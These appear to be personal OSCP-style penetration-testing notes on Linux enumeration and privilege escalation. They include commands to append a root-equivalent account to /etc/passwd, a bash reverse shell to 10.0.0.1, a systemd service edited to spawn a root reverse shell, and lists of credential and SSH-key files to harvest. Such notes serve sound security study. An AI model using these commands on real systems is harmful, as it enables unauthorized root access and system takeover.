echo -n "6bcf2a4b6e5aca0f" | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
```
echo -n "HEX_BLOB" | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```



## ---------------------------------- END-OF-WINDOWS ----------------------------------
```
&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&
&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&
&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&END-OF-WINDOWS&
```
## ---------------------------------- END-OF-WINDOWS ----------------------------------

## ---------------------------------- LINUX ----------------------------------
```
&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX
&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX
&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX&LINUX
```
## ---------------------------------- LINUX ----------------------------------

Situational Awareness

### Getting your barings
**Get the OS details**
```
uname -a                                            # Linux enum 
```

**OS version which was issued**

```
cat /etc/issue                                      # Linux enum 
```

**Release-specific information**
```                 
/etc/os-release                                     # Linux enum 
```

**linux Kernel version running**
```
lsb_release -a                                      # Linux enum 
```
**Look for accounts**
```
cat /etc/passwd                                    # Linux enum 
```

**Look for accounts with shell access**
```
cat /etc/passwd | grep -E "\w+sh\b"                # Linux enum 
```

**Have a look ain the home dir** 
```
ls -la
find / -type f -iname "*.bak" 2>/dev/null           # Linux Enum - look for backup files 
find / -type d -iname "*backup*" 2>/dev/null        # Linux Enum - look for backup directories

```
**Things in the /usr/local are normally placed explicitly by the admin so could be interesting and non standard. The package manager would not have put it there.**
```
ls -la /usr/local/
ls -la /root/               # also check root . You might be lucky and bea able to read the files, even if you are not root user

```
#### Capabilities
```
/usr/sbin/getcap -r / 2>/dev/null                   # Linux Enum - look for binaries with capabilities set 
getcap -r / 2>/dev/null                             # Linux Enum - look for binaries with capabilities set 
```
#### suid
```
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;    # Lin Privesc - look for SUID bins
```


```
sniff all the process    # Linux Enum - use psspy every time!!!  https://github.com/DominicBreuker/pspy  - OSCP B - Berlin jdwp 
```


```
disk             # Linux enum - important groups - raw device access, read root files
sudo             # Linux enum - important groups - run commands as root
docker           # Linux enum - important groups - escape containers, mount host FS
lxd              # Linux enum - important groups - manage LXC containers as root
adm              # Linux enum - important groups - read system logs
shadow           # Linux enum - important groups - read /etc/shadow password hashes
backup           # Linux enum - important groups - access backup configs and secrets
systemd-journal  # Linux enum - important groups - read journal logs, possible creds
wheel            # Linux enum - important groups - sudo/root group on some systems
uucp             # Linux enum - important groups - serial port and device access
dialout          # Linux enum - important groups - access to modems and serial devices
cdrom            # Linux enum - important groups - access optical drives
floppy           # Linux enum - important groups - legacy media, rarely useful
audio            # Linux enum - important groups - control audio devices
video            # Linux enum - important groups - access camera, screen capture
plugdev          # Linux enum - important groups - mount USB, plug-in devices
www-data         # Linux enum - important groups - webserver user, risky if misconfigured

```

# Some expected SUID Binaries and Their Purposes

```
/usr/bin/su                                    # Linux Enum - expected SUID - Switch user to root securely.
/usr/bin/passwd                                # Linux Enum - expected SUID - Allows users to change their passwords.
/usr/bin/chsh                                  # Linux Enum - expected SUID - Change user's default login shell.
/usr/bin/chfn                                  # Linux Enum - expected SUID - Modify user's personal information.
/usr/bin/umount                                # Linux Enum - expected SUID - Unmount filesystems without root privileges.
/usr/bin/mount                                 # Linux Enum - expected SUID - Mount filesystems securely for users.
/usr/bin/sudo                                  # Linux Enum - expected SUID - Controlled privilege escalation for users.
/usr/bin/pkexec                                # Linux Enum - expected SUID - Execute commands as another user (PolicyKit).
/usr/bin/fusermount                            # Linux Enum - expected SUID - Mount FUSE filesystems for non-root users.
/usr/bin/mount.cifs                            # Linux Enum - expected SUID - Mount CIFS/SMB network shares.
/usr/bin/gpasswd                               # Linux Enum - expected SUID - Manage group passwords securely.
/usr/bin/newgrp                                # Linux Enum - expected SUID - Change the active group ID temporarily.
/usr/bin/sg                                    # Linux Enum - expected SUID - Execute commands as a specific group.
/usr/bin/expiry                                # Linux Enum - expected SUID - Manage user account expiration dates.
/usr/lib/dbus-1.0/dbus-daemon-launch-helper    # Linux Enum - expected SUID - Assists D-Bus message bus system processes.
/usr/lib/ssh/ssh-keysign                       # Linux Enum - expected SUID - Host-based SSH authentication support.
/usr/lib/Xorg.wrap                             # Linux Enum - expected SUID - Wrapper for running the X server securely.
/usr/lib/polkit-1/polkit-agent-helper-1        # Linux Enum - expected SUID - Helps with privilege escalation (PolicyKit).
/usr/bin/chage                                 # Linux Enum - expected SUID - Modify password expiration information.
```

See capabilities of a binary 

```
filecap /bin/<BINARY_NAME>                     # Linux enum bianries -  will show the caps of a ping . eg **Cap_net_raw**.
```
**eth0 see if funny NAT stuff going on**

```sh
ip a        # without "-" is correct!!          
```
**List all the commands the user can run as root. May require user Auth**
```
sudo -l
```
**SUID FILES**
```
find / -perm -u=s -executable 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'   # Linux Enum - list SUID files which the current user can execute
find / -type f -perm -4000 -ls 2>/dev/null                                   # Linux Enum - find SUIDs
```
### Files with insecure permissions and juicy stuff
[Find](http://man7.org/linux/man-pages/man1/find.1.html)
`find / -writable -type d 2>/dev/null`
`find / -writable -type f 2>/dev/null`

If /etc/passwd is writable , create the root2 users password ( check the crypto matches)

``` sh
└─$openssl passwd w00t                                                                                                                                          # If /etc/passwd is writable 
pmvbOjc1patek                                                                                                                                                   # If /etc/passwd is writable 
└─$ echo "root2:pmvbOjc1patek:0:0:root:/root:/bin/bash" >> /etc/passwd                                                                                          # If /etc/passwd is writable 
```
( # If /etc/passwd is writable ) Or this method from Offsec Megavolt - Tee had sudo on a particular file LFI
```
(cat /etc/passwd && echo "toor:$(openssl passwd password):0:0:root:/root:/bin/bash") | sudo tee /var/log/httpd/../../../../../../etc/passwd                     # If /etc/passwd is writable 
```





```sh
find / -type d -writable -exec echo {} \; 2>/dev/null 
find /intreting/directory/ -writable
grep -R system .
grep -R popen .
```

### more Linux Enum


```sh

Systemd Unit Files:
/etc/systemd/system/<SERVICE>>.service                                        # Linux Enum Files - Systemd Unit Files:
/lib/systemd/system/                                                          # Linux Enum Files - Systemd Unit Files:
/etc/init.d/                                                                  # Linux Enum Files - Init Scripts (if not using systemd):     
/etc/rc.local                                                                 # Linux Enum Files - Init Scripts (if not using systemd):    
/etc/environment                                                              # Linux Enum Files - Environment Files:
/etc/default/stats                                                            # Linux Enum Files - Environment Files:
/etc/profile.d/                                                               # Linux Enum Files - Environment Files:
/opt/APP_NAME/                                                                # Linux Enum Files - Application-Specific Config Files: (or wherever the app is installed)
/var/www/                                                                     # Linux Enum Files - Application-Specific Config Files: (if it's a web app) 
application.properties, application.yml, or .env files
Jar or War File Contents:
- Extract with:
/var/log/stats.log                                                            # Linux Enum Files - Log files 
/var/log/syslog                                                               # Linux Enum Files - Log files 
/var/log/journal/                                                             # Linux Enum Files - Log files 
/etc/iptables/                                                                # Linux Enum Files - Firewall and Networking Configs:
/etc/ufw/                                                                     # Linux Enum Files - Firewall and Networking Configs:
/etc/hosts                                                                    # Linux Enum Files - Firewall and Networking Configs:
/etc/ufw/user.rules
ls /etc/cron.d/       !!!!  CRON                                                  # Linux Enum Files - Cron Jobs: Check each cron job and also with pspy
/etc/cron*                                                                    # Linux Enum Files - Cron Jobs:
crontab -l for the user running the app.                                      # Linux Enum Files - Cron Jobs:
Process-Specific Directories:
/proc/<PID>/cmdline                                                           # Linux Enum Files - Process-Specific Directories:       
/proc/<PID>/fd/                                                               # Linux Enum Files - Process-Specific Directories:   
$JAVA_HOME/ (defined in /etc/profile, /etc/environment, or user .bashrc).     # Linux Enum Files - Java Home Configurations:
```


### Linux Enum Interesting Files

```sh
/home/USER/.ssh/id_ecdsa                   # Linux Enum Files Interesting - SSH Key: Private ECDSA key for Anita
/home/USER/.ssh/id_rsa                     # Linux Enum Files Interesting - SSH Key: Private RSA key
/home/USER/.ssh/id_ed25519                 # Linux Enum Files Interesting - SSH Key: Private Ed25519 key
/home/USER/.ssh/authorized_keys            # Linux Enum Files Interesting - SSH Key: Public keys allowed for authentication
/home/USER/.ssh/config                     # Linux Enum Files Interesting - SSH Config: User-specific SSH configuration
/home/USER/.ssh/known_hosts                # Linux Enum Files Interesting - SSH Config: Hosts the user has connected to
/home/USER/.ssh/id_*                       # Linux Enum Files Interesting - SSH Key: Wildcard for any other private keys
/home/USER/.ssh/id_*_pub                   # Linux Enum Files Interesting - SSH Key: Public key for matching private keys
/root/.ssh/id_rsa                          # Linux Enum Files Interesting - SSH Key: Root user’s private RSA key
/root/.ssh/id_ecdsa                        # Linux Enum Files Interesting - SSH Key: Root user’s private ECDSA key
/root/.ssh/authorized_keys                 # Linux Enum Files Interesting - SSH Key: Root user’s authorized keys
/etc/ssh/ssh_config                        # Linux Enum Files Interesting - SSH Config: Global SSH client configuration
/etc/ssh/sshd_config                       # Linux Enum Files Interesting - SSH Config: Global SSH server configuration
/etc/ssh/authorized_keys                   # Linux Enum Files Interesting - SSH Key: System-wide authorized keys
/var/log/auth.log                          # Linux Enum Files Interesting - Log File: SSH login attempts (Debian-based)
/var/log/secure                            # Linux Enum Files Interesting - Log File: SSH login attempts (RedHat-based)
/etc/knockd.conf                           # Linux Enum Files Interesting - Knock D configuration to shopw port knockiong seqiuence
/etc/passwd                                # Linux Enum Files Interesting - User enumeration
/etc/shadow                                # Linux Enum Files Interesting - Password hashes (if readable)
/etc/group                                 # Linux Enum Files Interesting - User group memberships
/etc/passwd-                               # Linux Interesting Files - Backup passwd file (sometimes mis-permissioned)
/etc/shadow-                               # Linux Interesting Files - Backup shadow file (sometimes mis-permissioned)
/etc/sudoers                               # Linux Interesting Files - Sudo rules (NOPASSWD/wildcards/env_keep)
/etc/sudoers.d/                            # Linux Interesting Files - Drop-in sudo rules (often overlooked)
/etc/crontab                               # Linux Interesting Files - System cron jobs (writable scripts = privesc)
/etc/cron.d/                               # Linux Interesting Files - Extra cron definitions
/etc/cron.daily/                           # Linux Interesting Files - Scheduled scripts
/etc/cron.hourly/                          # Linux Interesting Files - Scheduled scripts
/etc/cron.weekly/                          # Linux Interesting Files - Scheduled scripts
/etc/cron.monthly/                         # Linux Interesting Files - Scheduled scripts
/var/backups/.ssh/                         # Linux Enum Files Interesting - Backup: Possible backups of `.ssh` directories
/backup/home/USER/.ssh/                    # Linux Enum Files Interesting - Backup: Anita’s `.ssh` directory in backups
/tmp/ssh-XXXXXX                            # Linux Enum Files Interesting - Temporary File: SSH agent sockets
/var/lib/jenkins/.ssh/id_rsa               # Linux Enum Files Interesting - SSH Key: Potential CI/CD system private key
/opt/gitlab/.ssh/id_ed25519                # Linux Enum Files Interesting - SSH Key: GitLab system private key
/home/USER/.bash_history                   # Linux Interesting Files - Command history (often contains creds/tokens/hosts)
/root/.bash_history                        # Linux Interesting Files - Root command history (high value if readable)
/etc/environment                           # Linux Interesting Files - Global env vars (sometimes secrets/proxies)
/etc/profile                               # Linux Interesting Files - Global shell init (PATH changes)
/etc/profile.d/                            # Linux Interesting Files - Extra init scripts (PATH hijack / secrets)
/etc/network/interfaces                    # Linux Enum Files Interesting - Get network INterfaces
/sys/class/net/<INFCE>/address             # Linux Enum Files Interesting - get the MAC address based on the interface aquired from the command above. Will be in hex so may need decoding
/etc/machine-id                            # Linux Enum Files Interesting -  Get the machine ID
/proc/self/cgroup                          # Linux Enum Files Interesting - Get the cgroup
/proc/sys/kernel/random/boot_id            # Linux Enum Files Interesting - Alternative to the machine ID
/proc/self/environ                         # Linux Enum Files Interesting - Env vars
/etc/hostname                              # Linux Interesting Files - Hostname (environment context)
/etc/hosts                                 # Linux Interesting Files - Internal hostnames/services (lateral/vhost intel)
/etc/resolv.conf                           # Linux Interesting Files - DNS/search domains (helps recon)
/etc/os-release                            # Linux Interesting Files - Distro/version info (exploit triage)
/etc/fstab                                 # Linux Interesting Files - Mounts/options (nosuid/noexec/etc)
/etc/vsftpd.conf                           # Linux Interesting Files - vsftpd config (anon/write/chroot/TLS/PAM)
/etc/vsftpd.userlist                       # Linux Interesting Files - vsftpd allow/deny list (user enumeration)
/etc/pam.d/vsftpd                          # Linux Interesting Files - PAM auth chain for vsftpd
/etc/ftpusers                              # Linux Interesting Files - Users disallowed from FTP (username intel)
/var/www/html/wp-config.php                # Linux Enum Interesting Files <--- Wordpress conf
/var/www/configuration.php                 # Linux Enum Interesting Files <--- Joomla conf
/var/www/html/inc/header.inc.php           # Linux Enum Interesting Files <--- Dolphin conf
/var/www/html/sites/default/setting.php    # Linux Enum Interesting Files <--- Drupal conf
/var/www/configuration.php                 # Linux Enum Interesting Files <--- Mambo conf
/var/www/config.php                        # Linux Enum Interesting Files <--- PHP conf
/etc/nginx/nginx.conf                      # Linux Interesting Files - Nginx main config (vhosts/upstreams)
/etc/nginx/sites-enabled/                  # Linux Interesting Files - Nginx vhosts (hidden paths, internal-only)
/var/log/nginx/access.log                  # Linux Interesting Files - Endpoint discovery, creds in URLs
/var/log/nginx/error.log                   # Linux Interesting Files - Misconfigs, paths, stack traces
/etc/apache2/apache2.conf                  # Linux Interesting Files - Apache main config
/etc/apache2/sites-enabled/                # Linux Interesting Files - Apache vhosts
/var/log/apache2/access.log                # Linux Interesting Files - Endpoint discovery
/var/log/apache2/error.log                 # Linux Interesting Files - Errors/paths
/etc/php/*/fpm/pool.d/www.conf             # Linux Interesting Files - PHP-FPM pool (user/group/socket)
/etc/php/*/apache2/php.ini                 # Linux Interesting Files - PHP config (disable_functions/open_basedir)
/var/lib/grafana/grafana.db                # Linux Interestging Files - Grafana !!!! - main sqlite db: users, tokens, configs
/etc/grafana/grafana.ini                   # Linux Interestging Files - Grafana - main config: ports, auth, db, etc
/etc/grafana/provisioning/                 # Linux Interestging Files - Grafana - provisioning folder: datasources, dashboards, notifiers
/etc/grafana/provisioning/dashboards/      # Linux Interestging Files - Grafana - auto-loaded dashboards config
/etc/grafana/provisioning/datasources/     # Linux Interestging Files - Grafana - datasource definitions like Prometheus
/etc/grafana/provisioning/notifiers/       # Linux Interestging Files - Grafana - alert channels config
/var/lib/grafana/plugins/                  # Linux Interestging Files - Grafana - installed plugins directory
/etc/default/grafana-server                # Linux Interestging Files - Grafana - environment vars for service
/var/log/grafana/grafana.log               # Linux Interestging Files - Grafana - grafana logs: errors, startup info
/usr/share/grafana/public/                 # Linux Interestging Files - Grafana - web assets and frontend source
/etc/prometheus/prometheus.yml             # Linux Interesting Files - prometheus - main config: scrape jobs, rules
/etc/prometheus/rules/                     # Linux Interesting Files - prometheus - directory for alerting rules
/etc/prometheus/alert.rules                # Linux Interesting Files - prometheus - optional single alert rules file
/etc/prometheus/web.yml                    # Linux Interesting Files - prometheus - config for web UI (TLS, auth)
/var/lib/prometheus/                       # Linux Interesting Files - prometheus - time-series database storage
/var/log/prometheus/prometheus.log         # Linux Interesting Files - prometheus - logs for prometheus server
/etc/default/prometheus                    # Linux Interesting Files - prometheus - env vars and args for startup
/usr/share/prometheus/consoles/            # Linux Interesting Files - prometheus - web console templates
/usr/share/prometheus/console_libraries/   # Linux Interesting Files - prometheus - reused graph templates
/etc/mysql/my.cnf                          # Linux Interesting Files - MySQL config (creds/socket/settings)
/etc/my.cnf                                # Linux Interesting Files - Alternate MySQL config path
/root/.my.cnf                              # Linux Interesting Files - MySQL client creds (common jackpot)
/etc/redis/redis.conf                      # Linux Interesting Files - Redis - main config: bind, protected-mode, requirepass/aclfile, dir/dbfilename
/etc/redis/redis-server.conf               # Linux Interesting Files - Redis - alt config name (varies by distro/package)
/etc/redis/sentinel.conf                   # Linux Interesting Files - Redis - Sentinel config: monitored masters, auth-pass, announce, failover
/var/lib/redis/dump.rdb                    # Linux Interesting Files - Redis - RDB snapshot (may contain cached secrets/session data)
/var/lib/redis/appendonly.aof              # Linux Interesting Files - Redis - AOF persistence file (command history / data)
/var/lib/redis/                            # Linux Interesting Files - Redis - data dir (dir/dbfilename often point here)
/var/log/redis/redis-server.log            # Linux Interesting Files - Redis - logs (startup, auth failures, config paths)
/var/log/redis/redis.log                   # Linux Interesting Files - Redis - alternate log path/name
/etc/redis/users.acl                       # Linux Interesting Files - Redis - ACL users/permissions (if aclfile used)
/var/lib/redis/users.acl                   # Linux Interesting Files - Redis - ACL file sometimes stored in data dir
/etc/default/redis-server                  # Linux Interesting Files - Redis - Debian/Ubuntu env/args (may include CONF path, bind overrides)
/etc/sysconfig/redis                       # Linux Interesting Files - Redis - RHEL/CentOS env/args
/etc/systemd/system/redis.service          # Linux Interesting Files - Redis - systemd unit override/custom (ExecStart/conf path)
/lib/systemd/system/redis.service          # Linux Interesting Files - Redis - packaged unit (shows ExecStart + config location)
/usr/lib/systemd/system/redis.service      # Linux Interesting Files - Redis - packaged unit (alt location)
/run/redis/redis-server.sock               # Linux Interesting Files - Redis - unix socket (if enabled; confirms socket path)
/var/run/redis/redis-server.sock           # Linux Interesting Files - Redis - alternate socket path
/etc/postgresql/*/main/pg_hba.conf         # Linux Interesting Files - Postgres auth rules
/etc/postgresql/*/main/postgresql.conf     # Linux Interesting Files - Postgres listen/config
/etc/samba/smb.conf                        # Linux Interesting Files - Samba shares/auth/guest settings
/etc/snmp/snmpd.conf                       # Linux Interesting Files - SNMP community strings / extend
/etc/exports                               # Linux Interesting Files - NFS exports (no_root_squash risk)
/etc/docker/daemon.json                    # Linux Interesting Files - Docker daemon config
/var/run/docker.sock                       # Linux Interesting Files - Docker socket (if accessible = privesc)
/etc/containerd/config.toml                # Linux Interesting Files - containerd config
/etc/systemd/system/                       # Linux Interesting Files - Custom unit files (ExecStart/EnvFile paths)
/lib/systemd/system/                       # Linux Interesting Files - Packaged unit files (same idea)
/etc/NetworkManager/system-connections/    # Linux Interesting Files - Stored network/VPN/WiFi creds
/etc/krb5.conf                             # Linux Interesting Files - Kerberos realm/KDC info (AD-integrated Linux)

/home/root/.ssh/id_ecdsa
/home/root/.ssh/id_rsa
/home/root/.ssh/id_ed25519
/home/root/.ssh/authorized_keys
/home/root/.ssh/config
/home/root/.ssh/known_hosts
/home/root/.ssh/id_*
/home/root/.ssh/id_*_pub
/backup/home/root/.ssh/
/home/root/.bash_history


https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Linux-Sensitive-Files.txt    # Linux Interesting Files -   MAKE SURE TO CHECK THESE TOO!!!

```

#### Linux Networking 

```sh
ip a
ifconfig a    #  similar and more verbose
route
routel        # alternative to route 
ss -lntp        # see if anything is listening 
```

#### Basic Service Footprints
```sh
watch -n 1 "ps -aux | grep pass"                # Basic Service Footprints
sudo tcpdump -i lo -A | grep "pass"             # Basic Service Footprints
```
**List all the services which are running**
```
systemctl list-units --type=service         # Linux Enum - List all running services
```
**This will also list the services**
```
find /etc/ -name *.service                  # Linux Enum - List all running services         
```
We can then cat the service files to see how `systemd` starts it
```
cat /etc/systemd/system/SOME-SERVICE.service         # Linux Enum - List details of the running services - Remeber OSCP B Berlin jdwp 
```
We may have write permissions and be able to write a reverse shell in . We will juyts need to find a way to reboot/resata the system ( OSCP Hetemit)

```sh
[cmeeks@hetemit restjson_hetemit]$ cat /etc/systemd/system/pythonapp.service            
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000   <<<------ Changed this part of the service file  to a reverse shell 
TimeoutSec=30
RestartSec=15s
User=cmeeks                              <<<------ Changed this user of the service to root to spawn the reverse shell as root 
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```


Basic native Reverse shell
```
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```



**Look at the web server maybe in `/opt` or `/var/www`**

```
cat /etc/cron.d/*         # - Look at all the cron jobs - need privs to edit
```

**`doas` is an alt to sudo from bsd and the cnf file might list provledged commands which can be run**
```
cat /usr/local/etc/doas.conf 

https://sirensecurity.io/blog/linux-privilege-escalation-resources/       # Linux PRivesc -  LOOKS LIKE A VERY GOOD STARTING POITN FOR PRIVESC

echo 'wheel:*:0:root,www,andrew' >> /etc/group            # Linux PRivesc - add andrew to the wheel grou on BSD - ( equivilant ot sudoers full)
```

#### Linux Firewall Management Commands

##### General Firewall State Check
```sh
# Check if the Linux Firewall is active
sudo ufw status                                           # Linux Firewall - UFW - Show firewall status and rules
sudo firewall-cmd --state                                 # Linux Firewall - Firewalld - Show if firewalld is running
sudo systemctl status iptables                            # Linux Firewall - IPTables - Check if the iptables service is active


# Display all incoming Linux Firewall rules
sudo ufw status verbose                                   # Linux Firewall - UFW - Show detailed status including rules
sudo firewall-cmd --list-all                              # Linux Firewall - Firewalld - Show all rules for the active zone
sudo firewall-cmd --list-all --zone=public                # Linux Firewall - Firewalld - List rules for a specific zone
sudo iptables -L INPUT -v -n                              # Linux Firewall - IPTables - List all incoming traffic rules

# Add or modify Linux Firewall rules
sudo ufw allow 22/tcp                                     # Linux Firewall - UFW - Allow SSH (port 22) incoming
sudo firewall-cmd --add-port=80/tcp --permanent           # Linux Firewall - Firewalld - Allow HTTP (port 80)
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT       # Linux Firewall - IPTables - Allow HTTPS (port 443)

# Save or reload rules to apply changes to Linux Firewall
sudo ufw reload                                           # Linux Firewall - UFW - Reload the firewall to apply changes
sudo firewall-cmd --reload                                # Linux Firewall - Firewalld - Reload rules
sudo iptables-save > /etc/iptables/rules.v4               # Linux Firewall - IPTables - Save current rules (Debian/Ubuntu)

# Check logs or debug Linux Firewall issues
sudo ufw log                                              # Linux Firewall - UFW - View firewall logs
sudo journalctl -u firewalld                              # Linux Firewall - Firewalld - View logs
sudo iptables -L -v                                       # Linux Firewall - IPTables - Verbose output of rules
```

```sh
# Linux Enum Files Interesting firewall related (for LFI or manual inspection)

# ==== UFW (Uncomplicated Firewall) ====
/etc/ufw/user.rules                # Linux Enum Files Interesting firewall related - IPv4 user-defined UFW rules
/etc/ufw/user6.rules              # Linux Enum Files Interesting firewall related - IPv6 user-defined UFW rules
/etc/default/ufw                  # Linux Enum Files Interesting firewall related - UFW default configuration

# ==== iptables (Debian/Ubuntu) ====
/etc/iptables/rules.v4            # Linux Enum Files Interesting firewall related - Saved iptables rules for IPv4
/etc/iptables/rules.v6            # Linux Enum Files Interesting firewall related - Saved ip6tables rules for IPv6

# ==== iptables (RHEL/CentOS) ====
/etc/sysconfig/iptables           # Linux Enum Files Interesting firewall related - Persistent iptables config
/etc/sysconfig/ip6tables          # Linux Enum Files Interesting firewall related - Persistent ip6tables config

# ==== firewalld (RHEL/Fedora) ====
/etc/firewalld/firewalld.conf     # Linux Enum Files Interesting firewall related - firewalld main configuration
/etc/firewalld/zones/             # Linux Enum Files Interesting firewall related - Zone definitions (per interface)
/etc/firewalld/services/          # Linux Enum Files Interesting firewall related - Custom service rules

# ==== Kernel-level insights (LFI-friendly, read-only) ====
/proc/net/ip_tables_names         # Linux Enum Files Interesting firewall related - Active iptables tables
/proc/net/ip_tables_matches       # Linux Enum Files Interesting firewall related - Kernel-level match extensions
/proc/net/ip_tables_targets       # Linux Enum Files Interesting firewall related - Kernel-level target actions
```





#### Running Process with [ps](http://man7.org/linux/man-pages/man1/ps.1.html)

```
ps -ef --forest  
ps axjf  
ps -p <PID> -o cmd          # see which command started a process
```

`ps aux`
- `a` - all
- `u` - user readable
- `x` - with our without [tty](https://www.linusakesson.net/programming/tty/) . tty is the TeleType so this will show proccess which are not useing a terminal as awell as those whic hare.

#### Basic with watch (search for pass)
`watch -n 1 "ps -aux | grep pass"`

#### ps commands 

Caution, Long terminla Output might get truncated if your terminal is too small
`ps axjf` command displays a detailed process tree with the following columns:
- **PPID**: Parent Process ID, the process ID of the parent process.
- **PID**: Process ID, the unique ID of the process.
- **PGID**: Process Group ID, the ID of the process group.
- **SID**: Session ID, the ID of the session.
- **TTY**: Terminal associated with the process.
- **TPGID**: Terminal Process Group ID, the ID of the foreground process group.
- **STAT**: Process status (e.g., R for running, S for sleeping).
- **UID**: User ID of the process owner.
- **TIME**: CPU time used by the process.
- **COMMAND**: The command that initiated the process.

`ps -eo pid,ppid,pgid,sid,tty,tpgid,stat,uid,time,cmd --forest` provides a detailed, tree-structured view of running processes:
- **-e**: Displays all processes.
- **-o**: Specifies the output format.
- **pid**: Process ID.
- **ppid**: Parent Process ID.
- **pgid**: Process Group ID.
- **sid**: Session ID.
- **tty**: Terminal associated with the process.
- **tpgid**: Terminal Process Group ID.
- **stat**: Process status.
- **uid**: User ID of the process owner.
- **time**: CPU time used.
- **cmd**: Command that started the process.
- **--forest**: Displays processes in a tree structure showing parent-child relationships.


`ss -anp` example, 
- `-a` list all connections, 
- `-n` avoid hostname resolution (which may stall the command execution)  
- `-p` list the process name the connection belongs to 

#### Firewall Rules
ipv4 iptables rules are set in : `/etc/iptables/rules.v4`

### Scheduled tasks - Cron etc 

#### [Cron](https://en.wikipedia.org/wiki/Cron) 
```
ls -lah /etc/cron*                      # cron and Scheduled jobs - 
crontab -l - List Crons                 # cron and Scheduled jobs - 
crontab -e                              # cron and Scheduled jobs - manage these crontabs using)   
/etc/crontab                            # cron and Scheduled jobs - This is the main system-wide cron file.
/etc/cron.d/                            # cron and Scheduled jobs - This directory can contain additional cron job definitions.

# Check these directories which hold scripts that are run at the specified intervals (daily, hourly, weekly, monthly) for cron and Scheduled jobs -
/etc/cron.daily/                        # cron and Scheduled jobs -
/etc/cron.hourly/                       # cron and Scheduled jobs - 
/etc/cron.weekly/                       # cron and Scheduled jobs - 
/etc/cron.monthly/                      # cron and Scheduled jobs - 

# Per-User Crontabs - Each user's crontab file is stored under /var/spool/cron/crontabs/ (on some systems, it may be /var/spool/cron/), and each user has their own crontab file. # cron and Scheduled jobs -
grep "CRON" /var/log/syslog             # cron and Scheduled jobs - 
grep "pass" /var/log/cron.log           # cron and Scheduled jobs -
```

```sh
#### Anacron - # cron and Scheduled jobs -
A tool for scheduling tasks that are intended to run at periodic intervals but don't need to run at precise times. Anacron will run missed jobs after the system comes back online if the system was down when the job was supposed to run.

/etc/anacrontab                         # cron and Scheduled jobs - The configuration file for anacron.
/var/spool/anacron/                     # cron and Scheduled jobs -  This directory keeps track of when the anacron jobs were last run.
```

```
## Systemd Timers for cron and Scheduled jobs -
Many modern Linux distributions (like Ubuntu) use systemd to schedule tasks instead of cron. **Systemd timers** can replace cron jobs and are managed through the systemd service manager.
systemctl list-timers --all     # cron and Scheduled jobs -
# Locations:
/etc/systemd/system/                    # cron and Scheduled jobs - This is where system-wide timers might be defined.
/lib/systemd/system/                    # cron and Scheduled jobs - Some predefined timers may reside here.
/usr/lib/systemd/system/                # cron and Scheduled jobs - Another place for predefined timers.

```

#### Listen for cron jobs to appear wich could be running script
```
# 1. Run top with the following  - cron and Scheduled jobs -
top -c -u 0                             # cron and Scheduled jobs - with top see the active processes includeing the command and the current user to see if a crn job is runing every XXX mins

# 2. Filter in top by pressing "o" and then apply something like:     cron and Scheduled jobs - 
COMMAND=/bin/sh                         # cron and Scheduled jobs - Top filter         
```

```sh
gcc -o [executable_name] [source_file].c          # gcc - basic command to compile and exploit 
gcc -o exp exp.c                                  # gcc - basic command to compile and exploit 
```




### Enumeration of all installed applications
We should know how to manually query installed packages as this is needed to corroborate information obtained during previous enumeration steps.

| Package Manager | Command to List All Packages | Operating Systems | Description |
|-----------------|------------------------------|-------------------|-------------|
| `apt`           | `apt list --installed`        | Debian, Ubuntu, Linux Mint, Pop!_OS | High-level package manager that handles dependencies and repositories easily. |
| `dpkg`          | `dpkg -l`                     | Debian, Ubuntu, Linux Mint | Low-level package manager that manages `.deb` packages but does not resolve dependencies. |
| `yum`           | `yum list installed`          | CentOS, RHEL, Fedora (older versions) | High-level package manager for managing RPM packages and resolving dependencies. |
| `dnf`           | `dnf list installed`          | Fedora, CentOS 8+, RHEL 8+ | High-level replacement for YUM with better performance and dependency resolution. |
| `zypper`        | `zypper se --installed-only`  | openSUSE, SUSE Linux Enterprise | High-level package manager that handles dependencies and repository management with advanced conflict resolution. |
| `pacman`        | `pacman -Q`                   | Arch Linux, Manjaro | Low-level package manager that is lightweight and fast, managing both binaries and source packages. |
| `rpm`           | `rpm -qa`                     | RHEL, CentOS, Fedora, openSUSE | Low-level package manager for handling individual RPM packages; doesn't resolve dependencies. |
| `eopkg`         | `eopkg list-installed`        | Solus | High-level package manager for the Solus distro, handles dependencies. |
| `xbps`          | `xbps-query -l`               | Void Linux | Low-level package manager for managing binary packages, with minimal overhead. |
| `snap`          | `snap list`                   | Ubuntu, Debian, Fedora, Arch Linux | High-level, cross-distribution package manager for containerized applications, providing isolation. |
| `flatpak`       | `flatpak list`                | Various distributions (cross-platform) | High-level, cross-distribution package manager similar to Snap, designed for sandboxed app deployment. |
| `nix`           | `nix-env -q`                  | NixOS, other distributions with Nix installed | High-level package manager with declarative configuration, supporting system-wide and user-level environments. |


#### Mounted drives 
